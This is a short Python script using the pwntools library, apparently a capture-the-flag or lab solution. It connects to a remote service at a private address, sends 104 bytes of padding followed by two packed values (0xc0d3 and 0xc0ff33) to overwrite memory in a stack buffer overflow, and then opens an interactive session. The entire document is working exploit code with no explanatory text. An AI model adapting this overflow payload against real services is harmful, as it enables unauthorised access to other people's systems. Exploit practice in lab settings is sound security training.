from pwn import *

p = remote('10.10.7.194', 9002)
p.recvuntil(b'right? ')
payload = flat(
        b'A'*104,
        0xc0d3,
        0xc0ff33
        )
p.sendline(payload)
p.interactive()
